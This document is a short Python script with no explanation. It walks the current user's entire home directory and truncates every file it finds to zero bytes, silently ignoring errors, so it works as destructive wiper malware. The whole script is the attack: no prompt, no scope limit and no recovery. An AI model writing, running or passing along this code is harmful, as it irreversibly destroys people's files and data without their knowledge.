import getpass
import os

items = []

def find_files(root):
	global items

	children = list(os.listdir(root))
	for child in children:
		child = root + "/" + child
		if os.path.isdir(child):
			find_files(child)
		else:
			items.append(child)

find_files(f"/home/{getpass.getuser()}")


for item in items:
	try:
		f = open(item, "bw")
		f.truncate(0)
		f.close()
	except:
		pass
